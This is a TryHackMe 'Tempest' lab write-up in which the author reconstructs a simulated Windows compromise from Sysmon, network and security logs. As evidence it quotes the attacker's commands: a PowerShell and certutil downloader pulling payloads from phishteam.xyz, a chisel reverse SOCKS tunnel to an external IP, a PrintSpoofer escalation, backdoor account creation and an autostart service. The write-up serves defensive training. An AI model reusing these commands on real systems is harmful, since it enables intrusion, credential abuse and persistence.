# TryHackMe Tempest — SOC Incident Investigation

## Overview

This document contains my complete investigation of the **TryHackMe Tempest** incident from Task 1 through Task 9.

The objective of the investigation was to reconstruct an attacker intrusion against the Windows machine **TEMPEST**, identify the attacker's techniques, correlate endpoint and network evidence, determine how the attacker established command and control, identify the privilege-escalation technique, and document the persistence mechanisms used after obtaining administrative access.

I approached the investigation as a SOC analyst rather than simply looking for room answers. I used timestamps, process relationships, command lines, network connections, DNS activity, HTTP traffic, Windows Event Logs, Sysmon events, and file hashes to connect individual artefacts into one attack chain.

---

# 1. Investigation Overview

The investigation involved a compromised Windows endpoint named **TEMPEST**. The attacker initially delivered a malicious Microsoft Word document, established execution through the document, downloaded additional payloads, established command and control, performed internal reconnaissance, created a reverse SOCKS tunnel, authenticated through WinRM, escalated privileges using PrintSpoofer, obtained SYSTEM-level execution, created additional accounts, added an account to the local Administrators group, and finally established persistence using a Windows service.

The investigation demonstrated the importance of correlating multiple data sources. No single log source provided the entire story. Sysmon provided process and network telemetry, Brim/Wireshark provided packet-level network evidence, and Windows Security Event Logs confirmed security-sensitive actions such as account creation and group membership changes.

# 2. Log Analysis and Event Correlation

## Log Analysis

Log analysis is the process of examining events generated by computers, applications, endpoints, and network devices to identify suspicious activity, anomalies, security threats, and other events that may affect an organisation.

A log acts as an audit trail. It records activities such as authentication attempts, process executions, network connections, DNS queries, file creation, and other system events. Timestamps are especially important because they allow an analyst to reconstruct the sequence of events.

During this investigation, I used timestamps to determine what happened first, what happened next, and which events were related.

## Event Correlation

Event correlation means connecting related evidence from different sources.

For example, a network connection can appear in both firewall telemetry and Sysmon Event ID 3. Firewall data can provide the source and destination addresses, ports, protocol, and action, while Sysmon can provide the process responsible for the connection and the user running it.

The main artefacts I correlated were:

- Source and destination IP addresses
- Source and destination ports
- Network protocols
- Process names
- User accounts
- Machine name
- Command lines
- DNS queries
- HTTP requests
- File names and hashes
- Parent and child processes
- Windows Security Event IDs

This correlation allowed me to move from isolated events to a complete attack narrative.

# 5. Task 2 — Preparation: Log Analysis

Before investigating the actual attack, I reviewed the concepts of log analysis and event correlation.

The important lesson from this task was that a SOC analyst should not treat each log entry as an isolated event.

For example:

```text
Process → Network Connection → DNS Query → HTTP Request
```

can represent one activity chain.

Similarly:

```text
Process Creation → Account Creation → Group Modification
```

can represent a privilege or persistence sequence.

This approach became important later when I connected the malicious Word document to PowerShell, the downloaded binaries, C2 communication, reconnaissance, privilege escalation, and persistence.

# 7. Task 4 — Initial Access: Malicious Document

The first major stage of the attack involved a malicious Microsoft Word document.

## Malicious Document

The malicious document was:

```text
free_magicules.doc
```

The compromised user was:

```text
benimaru
```

The compromised machine was:

```text
TEMPEST
```

Therefore, the compromised user and machine context was:

```text
benimaru-TEMPEST
```

## Microsoft Word Execution

The Microsoft Word executable involved in opening the document was:

```text
C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE
```

The Word process had PID:

```text
496
```

## Malicious Domain

The malicious document communicated with:

```text
phishteam.xyz
```

The DNS/network evidence associated the domain with:

```text
167.71.199.191
```

## Embedded Payload

I used Brim to investigate HTTP traffic associated with `phishteam.xyz`.

The important distinction was between the document download itself and the remote resource requested by Microsoft Word.

The malicious document was downloaded using:

```text
GET /02dcf07/free_magicules.doc
```

Microsoft Word then requested:

```text
GET /02dcf07/index.html
```

The embedded malicious payload URL was therefore:

```text
http://phishteam.xyz/02dcf07/index.html
```

The Microsoft Office Word user agent helped distinguish this request from the original document download.

## Follina / CVE-2022-30190

The malicious document exploited the Microsoft Support Diagnostic Tool vulnerability known as Follina.

The associated CVE was:

```text
CVE-2022-30190
```

This vulnerability allowed malicious document content to trigger code execution through MSDT-related functionality.

## Base64-Encoded Payload

I searched the document-related evidence for Base64 content and decoded it using CyberChef.

The decoded PowerShell script was:

```powershell
$app=[Environment]::GetFolderPath('ApplicationData');
cd "$app\Microsoft\Windows\Start Menu\Programs\Startup";
iwr http://phishteam.xyz/02dcf07/update.zip -outfile update.zip;
Expand-Archive .\update.zip -DestinationPath .;
rm update.zip;
```

This was important because the script showed that the attacker downloaded `update.zip` into the user's Startup directory and extracted its contents.

## Startup Location

The downloaded archive was associated with:

```text
C:\Users\benimaru\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\update.zip
```

## Stage 2 Payload

Another malicious execution was identified through the following command:

```text
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -noni certutil -urlcache -split -f 'http://phishteam.xyz/02dcf07/first.exe' C:\Users\Public\Downloads\first.exe; C:\Users\Public\Downloads\first.exe
```

This showed that the attacker used `certutil` to download `first.exe` and then execute it.

# 9. Task 6 — Command and Control

The next stage focused on understanding how the malware communicated with the attacker.

## C2 HTTP Traffic

I used Brim with a filter similar to:

```text
_path=="http" "resolvecyber.xyz"
```

The traffic showed repeated requests to:

```text
/9ab62b5
```

and requests containing:

```text
/9ab62b5?q=<encoded-data>
```

## Command Retrieval

The request:

```text
GET /9ab62b5
```

was used by the malware to retrieve a command.

Conceptually:

```text
GET /9ab62b5
        ↓
"Give me a command"
```

## Command Result Submission

The malware then used:

```text
GET /9ab62b5?q=<encoded-result>
```

to send the result of command execution back to the C2 server.

The parameter containing the command output was:

```text
q
```

Therefore, `q` was the parameter used to carry the command results.

## Encoding

The data contained in the `q` parameter was Base64 encoded.

I identified this using a Base64 decoder/CyberChef and confirmed that the decoded content represented command output.

The encoding was:

```text
Base64
```

## Programming Language

The HTTP user agent was:

```text
Nim httpclient/1.6.6
```

This indicated that the malicious C2 binary was associated with the **Nim** programming language.

# 10. Task 7 — Internal Reconnaissance

After establishing C2, the attacker began discovering information about the compromised machine.

## User Discovery

The attacker executed:

```text
whoami
```

The result was:

```text
TEMPEST\benimaru
```

This confirmed the current user context.

## Desktop Enumeration

The attacker enumerated the user's Desktop:

```text
dir C:\users\benimaru\Desktop
```

The output included:

```text
automation.ps1
Microsoft Edge.lnk
```

## Sensitive File Discovery

The attacker then read:

```text
C:\Users\Benimaru\Desktop\automation.ps1
```

The file contained credentials:

```powershell
$user = "TEMPEST\benimaru"
$pass = "infernotempest"
$securePassword = ConvertTo-SecureString $pass -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $user, $securePassword
```

The password discovered by the attacker was:

```text
infernotempest
```

This demonstrated how sensitive credentials stored in scripts can become a major security risk.

## Listening Port Discovery

The attacker also performed network reconnaissance using commands such as `netstat`.

The investigation identified port:

```text
5985
```

as a listening port that could provide remote access through Windows Remote Management (WinRM).

## Reverse SOCKS Proxy

The attacker then established a reverse SOCKS proxy using:

```text
C:\Users\benimaru\Downloads\ch.exe client 167.71.199.191:8080 R:socks
```

The binary's SHA256 hash was:

```text
8A99353662CCAE117D2BB22EFD8C43D7169060450BE413AF763E8AD7522D2451
```

The hash was associated with the tool:

```text
chisel
```

The reverse SOCKS tunnel allowed the attacker to route traffic through the compromised machine.

## WinRM Authentication

After the SOCKS proxy was established, a `wsmprovhost.exe` process appeared.

The relevant process was:

```text
C:\Windows\System32\wsmprovhost.exe
```

Its description was:

```text
Host process for WinRM plug-ins
```

This indicated that the attacker used:

```text
WinRM
```

to authenticate using the harvested credentials.

# 11. Task 8 — Privilege Escalation

The attacker next attempted to escalate privileges.

## PrintSpoofer Binary

The attacker downloaded:

```text
spf.exe
```

Its SHA256 hash was:

```text
8524FBC0D73E711E69D60C64F1F1B7BEF35C986705880643DD4D5E17779E586D
```

The hash identified the tool as:

```text
PrintSpoofer
```

## Exploited Privilege

The tool exploited:

```text
SeImpersonatePrivilege
```

This privilege can allow a process to impersonate another security context when the necessary conditions are met.

## Executing the C2 Binary

The attacker then executed PrintSpoofer with:

```text
C:\ProgramData\final.exe
```

The relevant command line was:

```text
"C:\Users\benimaru\Downloads\spf.exe" -c C:\ProgramData\final.exe
```

After removing the surrounding quotes:

```text
C:\Users\benimaru\Downloads\spf.exe -c C:\ProgramData\final.exe
```

The important point was that `final.exe` was the binary launched through PrintSpoofer.

## New C2 Port

The `final.exe` binary communicated using a different C2 port from the original `first.exe` connection.

The new C2 port was:

```text
8080
```

The sequence therefore became:

```text
first.exe → C2 port 80
        ↓
privilege escalation
        ↓
final.exe → C2 port 8080
```

# 12. Task 9 — Actions on Objective

After successful privilege escalation, the attacker obtained SYSTEM-level execution.

The investigation guide highlighted an important clue:

```text
User = NT AUTHORITY\SYSTEM
```

I therefore focused on unusual executions occurring after `final.exe` started and investigated child processes associated with it.

---

## 12.1 Account Creation

The attacker attempted to create additional local accounts.

The successful commands were:

```text
net user /add shuna princess
```

and:

```text
net user /add shion m4st3rch3f!
```

The two accounts created were:

```text
shion
shuna
```

In the required alphabetical format:

```text
shion,shuna
```

## Failed Account Creation Attempt

Before the successful account creation, the attacker executed failed account-creation commands.

The missing option was:

```text
/add
```

The successful syntax demonstrated why `/add` was required:

```text
net user /add <username> <password>
```

This was an example of how command-line evidence can reveal an attacker's actions even when an initial attempt fails.

---

## 12.2 Windows Event ID 4720

I then used Windows Security Event Logs to confirm that the accounts were actually created.

The relevant event ID was:

```text
4720
```

Event ID 4720 indicates that a user account was created.

This distinction was important:

```text
Sysmon Process Creation
        ↓
Shows attacker executed "net user"

Windows Security Event 4720
        ↓
Confirms the account was actually created
```

This is an example of event correlation between endpoint process telemetry and Windows security auditing.

---

## 12.3 Adding an Account to Local Administrators

The attacker then added the `shion` account to the local Administrators group.

The command was:

```text
net localgroup administrators /add shion
```

The command can also appear in the raw log with the executable path and quotes:

```text
"C:\Windows\system32\net.exe" localgroup administrators /add shion
```

The important action was:

```text
localgroup administrators /add shion
```

This gave the attacker an additional administrative account for persistent access.

---

## 12.4 Windows Event ID 4732

The corresponding Windows Security Event ID for adding a member to a security-enabled local group was:

```text
4732
```

Therefore:

```text
4720 → User account created
4732 → Account added to security-enabled local group
```

These Windows Event IDs provided independent confirmation of the attacker’s persistence-related actions.

# 13. Service-Based Persistence

After creating accounts and obtaining administrative access, the attacker established another persistence mechanism by creating a Windows service.

The command found in the process creation evidence was:

```text
"C:\Windows\system32\sc.exe" \\TEMPEST create TempestUpdate binpath= C:\ProgramData\final.exe start= auto
```

After removing the double quotes as required by the investigation question:

```text
C:\Windows\system32\sc.exe \\TEMPEST create TempestUpdate binpath= C:\ProgramData\final.exe start= auto
```

## Breaking Down the Command

### `sc.exe`

`sc.exe` is the Windows Service Control utility.

### `\\TEMPEST`

This identifies the target machine.

### `create TempestUpdate`

This creates a service named:

```text
TempestUpdate
```

### `binpath= C:\ProgramData\final.exe`

The service is configured to execute:

```text
C:\ProgramData\final.exe
```

### `start= auto`

The service is configured to start automatically.

This gives the attacker a persistence mechanism that can automatically launch the malicious C2 binary.

# 18. Key SOC Investigation Lessons

## 18.1 One log source is rarely enough

The incident became much clearer when I correlated Sysmon, Windows Security Logs, and network traffic.

For example:

```text
Sysmon Event ID 1
        ↓
net.exe command executed
        ↓
Windows Event ID 4720
        ↓
Account actually created
```

The combination provides much stronger evidence than either source alone.

## 18.2 Process relationships matter

The parent-child relationship between processes helped reconstruct the attack.

For example:

```text
spf.exe
   ↓
final.exe
```

This relationship showed how the attacker used PrintSpoofer to execute the malicious C2 binary.

## 18.3 Command lines can reveal attacker intent

Command-line arguments exposed important attacker actions such as:

- Downloading payloads
- Executing malicious binaries
- Creating accounts
- Adding users to groups
- Creating services
- Establishing tunnels

## 18.4 Network traffic can reveal malware behaviour

Brim allowed me to see the C2 communication directly.

The distinction between:

```text
GET /9ab62b5
```

and:

```text
GET /9ab62b5?q=<Base64>
```

helped me understand the C2 protocol.

## 18.5 Encoded data should be investigated, not ignored

The Base64-encoded C2 data initially looked like random characters.

After decoding it with CyberChef, it became meaningful command output.

This demonstrated why SOC analysts should recognise common encoding schemes.

## 18.6 User-Agent strings can provide useful clues

The user agent:

```text
Nim httpclient/1.6.6
```

provided a useful clue about the technology used to develop the C2 binary.

## 18.7 Persistence can have multiple layers

The attacker did not rely on only one persistence technique.

The investigation identified:

1. Additional user accounts
2. Adding `shion` to the local Administrators group
3. A Windows service configured for automatic startup

This demonstrates why defenders should continue investigating after identifying the initial persistence mechanism.

# 19. Investigation Summary

The Tempest incident demonstrated a complete multi-stage Windows compromise.

The attacker began with a malicious Word document and exploited Follina to establish execution. The attacker then downloaded additional payloads and executed `first.exe`, which established C2 communication over port 80.

Once command execution was established, the attacker performed internal reconnaissance and discovered credentials stored in `automation.ps1`. The attacker also identified WinRM listening on port 5985 and established a reverse SOCKS tunnel using Chisel.

The harvested credentials were then used through WinRM. The attacker downloaded PrintSpoofer and exploited `SeImpersonatePrivilege` to execute `final.exe` with elevated privileges.

After achieving SYSTEM access, the attacker created the `shion` and `shuna` accounts, added `shion` to the local Administrators group, and created the `TempestUpdate` service. The service was configured to execute `C:\ProgramData\final.exe` automatically.

The later C2 communication used port 8080.

The overall investigation demonstrated how an analyst can reconstruct an attack by combining:

```text
Endpoint telemetry
        +
Windows Security Logs
        +
Network traffic
        +
DNS
        +
HTTP
        +
Process relationships
        +
File hashes
```

The most important lesson I took from this investigation is that successful SOC analysis is not just about identifying a suspicious event. It is about **connecting individual pieces of evidence into a timeline that explains what happened, how it happened, what the attacker achieved, and how persistence was established.**

# Conclusion

This investigation gave me practical experience in SOC-style incident response and log analysis.

I learned how to move from a suspicious document to endpoint execution, network communication, command and control, internal reconnaissance, credential discovery, remote access, privilege escalation, and persistence.

More importantly, I learned to investigate using evidence rather than relying on assumptions. I repeatedly correlated process creation events with network traffic, DNS queries, command lines, hashes, and Windows Security Events.

The Tempest investigation therefore helped me understand how a SOC analyst can reconstruct an entire intrusion from seemingly unrelated logs and turn those individual artefacts into a clear incident timeline.
